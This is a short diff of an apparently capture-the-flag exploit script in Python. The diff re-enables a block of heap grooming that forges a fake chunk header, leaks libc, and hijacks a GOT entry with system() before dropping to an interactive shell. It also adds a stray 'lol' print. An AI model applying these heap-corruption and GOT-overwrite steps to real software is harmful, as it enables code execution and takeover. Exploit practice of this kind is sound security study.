@@ -59,7 +59,6 @@ add_profile('B',9,0xa0,'BBBB')  #1
 del_profile(0)  #A
 realloc_errorr(1) #B
 add_profile('C',9,0xa0,'CCCC')  #0
-'''
 del_profile(1)  #B
 add_profile('D',9,0xc8,'D'*(0xb0-0x10) + chr(0xa0)+'\0'*7 + chr(0xf0))  #1 ,the fake C.name chunk header will be set later.
 
@@ -92,6 +91,6 @@ print 'libc : ',hex(libc)
 #hijcak got
 sys_addr = libc + 0x45390
 edit_profile(0,'hijack',123,p64(sys_addr))
-'''
+print 'lol'
 r.interactive()
 
